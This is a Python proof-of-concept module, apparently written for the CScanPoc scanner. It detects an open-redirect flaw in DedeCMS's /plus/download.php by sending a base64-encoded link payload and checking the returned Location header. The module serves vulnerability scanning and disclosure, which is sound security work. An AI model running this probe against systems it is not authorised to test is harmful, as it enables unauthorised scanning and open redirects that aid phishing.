# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0000'  # 平台漏洞编号，留空
    name = '织梦CMS 任意地址跳转'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2011-12-15'  # 漏洞公布时间
    desc = '''
        DedeCMS /plus/download.php?open= 任意地址跳转。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=3638'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '所有版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3ce279c4-fa37-4e21-9261-08d1b1da222f'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20"
            verify_url = '{target}'.format(target=self.target) + payload
            request = requests.get(verify_url, allow_redirects=False)
            if dict(request.headers).get('location') == 'http://www.baidu.com':
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
